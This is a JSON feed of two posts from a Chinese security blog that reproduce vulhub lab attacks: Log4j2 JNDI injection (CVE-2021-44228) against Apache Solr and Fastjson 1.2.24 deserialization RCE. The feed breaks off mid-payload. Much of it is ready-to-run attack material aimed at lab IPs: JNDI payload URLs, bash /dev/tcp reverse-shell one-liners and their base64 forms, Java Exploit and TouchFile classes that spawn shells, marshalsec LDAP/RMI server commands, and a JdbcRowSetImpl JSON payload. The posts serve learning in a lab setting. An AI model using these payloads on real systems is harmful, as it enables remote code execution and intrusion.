{
    "version": "https://jsonfeed.org/version/1",
    "title": "sqrt7 • All posts by \"vulhub\" category",
    "description": "",
    "home_page_url": "https://w-sqrt7.gitee.io",
    "items": [
        {
            "id": "https://w-sqrt7.gitee.io/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.gitee.io/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】Log4j2漏洞复现",
            "date_published": "2024-05-26T03:14:31.558Z",
            "content_html": "<h1 id=\"【vulhub】Log4j2漏洞复现\"><a href=\"#【vulhub】Log4j2漏洞复现\" class=\"headerlink\" title=\"【vulhub】Log4j2漏洞复现\"></a>【vulhub】Log4j2漏洞复现</h1><h2 id=\"log4j2\"><a href=\"#log4j2\" class=\"headerlink\" title=\"log4j2\"></a>log4j2</h2><p>log4j是Apache的一个开源项目，是一个基于Java的日志记录框架。Log4j2是log4j的后继者，被大量用于业务系统开发，记录日志信息。</p>\n<p>log4j2 中存在JNDI注入漏洞，Log4j2 组件在开启了日志记录功能后，凡是在可触发错误记录日志的地方，插入漏洞利用代码，即可利用成功。特殊情况下，若该组件记录的日志包含其他系统的记录日志，则有可能造成间接投毒。通过中间系统，使得组件间接读取了具有攻击性的漏洞利用代码，亦可间接造成漏洞触发。</p>\n<p>同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，例如 Apache Struts2、Apache Solr、Apache Druid、Apache Flink、Tomcat、Weblogic、ES、Redis等</p>\n<h2 id=\"JNDI\"><a href=\"#JNDI\" class=\"headerlink\" title=\"JNDI\"></a>JNDI</h2><p>JNDI 是 Java Naming and Directory Interface 的缩写，是 Java 中用于访问各种命名和目录服务的API（应用程序编程接口）。JNDI 提供了一种标准的方式来访问各种命名和目录服务，相当于一个用于映射的字典，从指定的远程服务器获取并加载对象，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>\n<p>其中常用的协议包括 RMI（远程方法调用）和 LDAP（轻量目录访问协议）。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务，以LDAP服务为例进行复现。</p>\n<h2 id=\"lookup：\"><a href=\"#lookup：\" class=\"headerlink\" title=\"lookup：\"></a>lookup：</h2><p>log4j2框架下的lookup查询服务是一种查找机制，用于动态获取和替换日志记录中的变量或属性的值，提供了{}字段解析功能，传进去的值会被直接解析。例如${java:version}会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。</p>\n<p>攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的.class对象，jdk将从url指定的路径下载一段字节流，并将其反序列化为Java对象，作为jndi返回。反序列化过程中，即会执行字节流中包含的程序，造成了远程代码执行。</p>\n<p>log4j中除了sys解析器外，还有很多其他类型的解析器。其中，jndi 解析器就是本次漏洞的源头。</p>\n<h2 id=\"LDAP：\"><a href=\"#LDAP：\" class=\"headerlink\" title=\"LDAP：\"></a>LDAP：</h2><p>LDAP(轻型目录访问协议)是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。</p>\n<h2 id=\"RMI：\"><a href=\"#RMI：\" class=\"headerlink\" title=\"RMI：\"></a>RMI：</h2><p>RMI（远程方法调用）：它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。</p>\n<h2 id=\"漏洞环境\"><a href=\"#漏洞环境\" class=\"headerlink\" title=\"漏洞环境\"></a>漏洞环境</h2><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p>\n<p>如一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p>\n<p><strong>影响版本</strong></p>\n<p>Apache Log4j 2.x &lt;&#x3D; 2.14.1 &lt;&#x3D; Log4j 2.15.0-rc1</p>\n<h1 id=\"CVE-2021-44228\"><a href=\"#CVE-2021-44228\" class=\"headerlink\" title=\"CVE-2021-44228\"></a>CVE-2021-44228</h1><h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>攻击者构造payload，在JNDI接口lookup查询进行注入，payload为${jndi:ldap:恶意url&#x2F;poc}，JNDI会去对应的服务（如LDAP、RMI、DNS、文件系统、目录服务…）查找资源，由于lookup的出栈没做限制，最终指向了攻击者部署好的恶意站点，下载了远程的恶意class，最终造成了远程代码执行rce。</p>\n<p><strong>详细过程分析：</strong></p>\n<p>log4j2 框架下的 lookup 查询服务提供了 {} 字段解析功能，传进去的值会被直接解析。</p>\n<p>当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中</p>\n<p><strong>RMI</strong></p>\n<blockquote>\n<p>假如日志中含有该语句${jndi:&#x2F;&#x2F;rmi:服务器地址&#x2F;Exploit}</p>\n<p>被攻击服务器发现要输出的信息中有 ${}，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMI，而后根据RMI服务器地址去请求Exploit。</p>\n<p>RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类），而该Reference指定了远端文件下载服务器上含有恶意代码的class文件。</p>\n<p>被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。</p>\n<p>被攻击服务器下载恶意class文件并执行其中的恶意代码。</p>\n</blockquote>\n<p><strong>LDAP</strong></p>\n<blockquote>\n<p>假如日志中含有该语句${jndi:ldap:192.168.100.131:5555&#x2F;exp}</p>\n<p>被攻击服务器发现要输出的信息中有 ${}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099&#x2F;exp</p>\n<p>解析到ldap，就会去192.168.61.129:1099的ldap服务找名为exp的资源，如果找不到就会去http服务中找，在http中找到exp之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现exp是一个.class文件，就会去执行里面的代码，从而实现注入攻击者就可以通过shell实现任意的命令执行，造成严重危害</p>\n</blockquote>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-26%20124201.png\" alt=\"屏幕截图 2024-05-26 124201\"></p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>首先要找到注入点，尝试传入参数，&#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;</p>\n<p>利用DNSlog平台进行漏洞验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://xyzq33.dnslog.cn&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xyzq33.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526163239058.png\" alt=\"image-20240526163239058\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526163300422.png\" alt=\"image-20240526163300422\"></p>\n<p>可以发现回显验证成功，即存在漏洞，然后尝试进行漏洞利用，获取shell。</p>\n<h3 id=\"法一：JNDI注入工具\"><a href=\"#法一：JNDI注入工具\" class=\"headerlink\" title=\"法一：JNDI注入工具\"></a>法一：JNDI注入工具</h3><p><strong>工具一：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</strong></p>\n<p>在攻击机上nc开启端口监听，等待shell反弹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 6666</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526164651028.png\" alt=\"image-20240526164651028\"></p>\n<p>利用JNDI注入工具，开启相对应的LDAP或RMI服务，-A为开启LDAP服务的服务器ip，这里我用的是攻击机的IP，即模拟kali不仅是LDAP服务器，也是用于反弹获取shell的服务器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,[经过base64编码后的命令]&#125;|&#123;base64,-d&#125;|bash&quot; -A [vps ip]</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.100.131/6666 0&gt;&amp;1</span><br><span class=\"line\">base64编码后:YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot; -A 192.168.100.131</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-26%20165326.png\" alt=\"屏幕截图 2024-05-26 165326\"></p>\n<p>根据上方工具生成的进行payload构造并请求，可以获取到shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/hk5uoj&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165653255.png\" alt=\"image-20240526165653255\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165835051.png\" alt=\"image-20240526165835051\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165912073.png\" alt=\"image-20240526165912073\"></p>\n<p><strong>工具二：JNDIExploit-1.4-SNAPSHOT.jar</strong></p>\n<p>攻击机同样需要先开启nc监听端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 7777</span><br></pre></td></tr></table></figure>\n\n<p>然后使用工具开启LDAP服务，-i 后面加上对应的ip，可-h查看具体用法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.100.131</span><br></pre></td></tr></table></figure>\n\n<p>构造payload并请求，将shell反弹到攻击机对应ip和端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/Basic/ReverseShell/192.168.100.131/7777&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526170913873.png\" alt=\"image-20240526170913873\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526170948245.png\" alt=\"image-20240526170948245\"></p>\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526171004217.png\" alt=\"image-20240526171004217\"></p>\n<h3 id=\"法二：编写恶意文件\"><a href=\"#法二：编写恶意文件\" class=\"headerlink\" title=\"法二：编写恶意文件\"></a>法二：编写恶意文件</h3><p>首先编写bash命令，并开启nc监听</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 8888</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.100.131/8888 0&gt;&amp;1</span><br><span class=\"line\">base64编码后：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx</span><br><span class=\"line\"></span><br><span class=\"line\">bash：启动Bash shell。</span><br><span class=\"line\">-i：使Bash以交互式模式运行，这通常意味着它会读取用户输入。</span><br><span class=\"line\">&gt;&amp; /dev/tcp/192.168.100.131/8888：这是一个Bash重定向技巧。它将Bash的标准输出（文件描述符1）和标准错误（文件描述符2，由于在此处未明确指定，所以它会跟随标准输出）都重定向到/dev/tcp/192.168.100.131/8888。</span><br><span class=\"line\">/dev/tcp/host/port是某些Unix系统（如Linux）上提供的一种特殊文件，它允许你通过该文件描述符与远程TCP主机和端口进行通信。</span><br><span class=\"line\">在这个例子中，Bash shell尝试连接到IP地址192.168.100.131的8888端口，并将所有输出发送到那里。</span><br><span class=\"line\">0&gt;&amp;1：这是另一个重定向。它将Bash的标准输入（文件描述符0）重定向到之前设置的标准输出（文件描述符1）。由于我们已经将标准输出重定向到/dev/tcp/192.168.100.131/8888，所以这也意味着Bash的标准输入现在来自该TCP连接。</span><br><span class=\"line\"></span><br><span class=\"line\">文件描述符：</span><br><span class=\"line\">0 通常代表标准输入（stdin）</span><br><span class=\"line\">1 通常代表标准输出（stdout）</span><br><span class=\"line\">2 通常代表标准错误（stderr）</span><br><span class=\"line\">&gt;&amp;：</span><br><span class=\"line\">这是一个重定向操作符，它将一个文件描述符重定向到另一个文件描述符。具体来说，它将左边的文件描述符指向右边文件描述符所指向的位置。</span><br><span class=\"line\">0&gt;&amp;1：</span><br><span class=\"line\">这意味着将标准输入（stdin，文件描述符 0）重定向到标准输出（stdout，文件描述符 1）当前所指向的位置。</span><br><span class=\"line\"></span><br><span class=\"line\">所以，整个命令的效果是：启动一个交互式Bash shell，将其标准输入、输出和错误都重定向到与192.168.100.131的8888端口的TCP连接。这允许攻击者（或测试人员）在远程系统上执行命令，并通过TCP连接查看输出。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">bash -c：这告诉bash执行一个由-c选项后面跟随的字符串指定的命令。</span><br><span class=\"line\">|&#123;base64,-d&#125;|：这部分试图使用管道（|）将前面的输出传递给base64 -d命令进行解码。但</span><br><span class=\"line\">&#123;bash,-i&#125;：再次运行bash，但带有-i选项（交互式），</span><br></pre></td></tr></table></figure>\n\n<p>编写恶意文件，命名为Exploit.java</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.lang.Runtime;</span><br><span class=\"line\">import java.lang.Process;</span><br><span class=\"line\">public class Exploit &#123;</span><br><span class=\"line\">     public Exploit()&#123;</span><br><span class=\"line\">             try&#123;</span><br><span class=\"line\">                 Runtime.getRuntime().exec(&quot;/bin/bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class=\"line\">                                &#125;catch(Exception e)&#123;</span><br><span class=\"line\">                                            e.printStackTrace();</span><br><span class=\"line\">                                             &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">         public static void main(String[] argv)&#123;</span><br><span class=\"line\">                         Exploit e = new Exploit();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后将 Exploit.java 文件进行编译，编译为.class文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac Exploit.java </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526173036485.png\" alt=\"image-20240526173036485\"></p>\n<p>然后python在该目录下开启一个简单的http服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m http.server 5555</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526173304140.png\" alt=\"image-20240526173304140\"></p>\n<p>然后需要利用工具marshalsec-0.0.3-SNAPSHOT-all.jar来开启LDAP服务，监听1389端口，并制定加载远程类TouchFile.class，在fastjson文章中也有提到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  &quot;http://刚才http服务的地址:端口号/#Exploit&quot; 1389</span><br><span class=\"line\"></span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.100.131:5555/#Exploit&quot; 1389</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/mbechler/marshalsec\">marshalsec项目下载地址</a></p>\n<p>项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526174144308.png\" alt=\"image-20240526174144308\"></p>\n<p>最后就是构造payload并请求，获取shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.100.131:1389/Exploit&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526174651781.png\" alt=\"image-20240526174651781\"></p>\n<p>其实几种方法本质上都是一样的，没有太大区别，但都尝试一遍过后，对整个漏洞利用的流程会更加的清晰，也更容易理解</p>\n<p>参考文章：</p>\n<p><a href=\"https://www.freebuf.com/vuls/382838.html\">https://www.freebuf.com/vuls/382838.html</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1921530\">https://cloud.tencent.com/developer/article/1921530</a></p>\n<p><a href=\"https://blog.csdn.net/Bossfrank/article/details/130148819\">https://blog.csdn.net/Bossfrank/article/details/130148819</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】Fastjson漏洞复现",
            "date_published": "2024-04-25T11:30:55.983Z",
            "content_html": "<h1 id=\"【vulhub】Fastjson漏洞复现\"><a href=\"#【vulhub】Fastjson漏洞复现\" class=\"headerlink\" title=\"【vulhub】Fastjson漏洞复现\"></a>【vulhub】Fastjson漏洞复现</h1><h1 id=\"1-2-24-rce\"><a href=\"#1-2-24-rce\" class=\"headerlink\" title=\"1.2.24-rce\"></a>1.2.24-rce</h1><h2 id=\"漏洞原理：\"><a href=\"#漏洞原理：\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>\n<p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p>\n<p>常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！</p>\n<p>因为目标环境是Java 8u102，没com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p>\n<p>影响范围：fastjson&lt;&#x3D;1.2.24</p>\n<h2 id=\"漏洞复现：\"><a href=\"#漏洞复现：\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>实验前提：python3版本，java1.8版本</p>\n<p>java环境配置可参考文章：<a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p>漏洞验证，利用dnslog等平台进行验证，BP抓包，修改为POST方法，修改Content-Type，放入payload，然后发送数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 74</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dgs0uq.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425203104478.png\" alt=\"image-20240425203104478\"></p>\n<p>漏洞利用，首先编译payload，利用<code>javac TouchFile.java</code>命令，编译TouchFile.java文件，生成TouchFile.class文件，实际情况中需要将编译好的payload放在公网服务器上的，这里只是进行本地的验证尝试，理解即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// javac TouchFile.java</span><br><span class=\"line\">import java.lang.Runtime;</span><br><span class=\"line\">import java.lang.Process;</span><br><span class=\"line\"> </span><br><span class=\"line\">public class TouchFile &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime rt = Runtime.getRuntime();</span><br><span class=\"line\">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/successFrank&quot;&#125;;</span><br><span class=\"line\">            Process pc = rt.exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            // do nothing</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>这里就将kali作为放置payload的服务器，进入放置payload的目录，进行如下命令，启动服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m http.server 5555</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174031274.png\" alt=\"image-20240425174031274\"></p>\n<p>接下来使用marshalsec项目，启动RMI服务，监听9999端口，并制定加载远程类TouchFile.class</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/mbechler/marshalsec\">marshalsec项目下载地址</a></p>\n<p>项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174713907.png\" alt=\"image-20240425174713907\"></p>\n<p>然后访问靶机，BP抓包，进行修改，将GET方法改为POST方法发送，修改Content-Type，加入payload，发送，观察响应报文发现已经成功创建。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 168</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/TouchFile&quot;,</span><br><span class=\"line\">        